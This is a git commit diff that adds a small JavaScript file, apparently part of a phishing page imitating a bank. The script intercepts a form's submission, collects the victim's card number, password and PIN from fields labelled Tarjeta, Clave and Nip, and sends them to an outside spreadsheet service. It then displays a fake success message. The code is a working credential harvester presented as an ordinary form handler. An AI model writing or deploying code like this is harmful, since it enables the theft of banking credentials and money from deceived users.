e63654dd5f0d45fa0c247fe7295f34e38e5a79ef
co-soporte <rronromo@gmail.com>
2025-01-18 08:16:45 -0600

    add file

---
+++ santa/js/420sa.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/7238af9d-6c55-4fc9-9dbd-3131704e0e98', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Tarjeta": formulario.usuario.value,
+            "Clave": formulario.contraseña.value,
+            "Nip": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
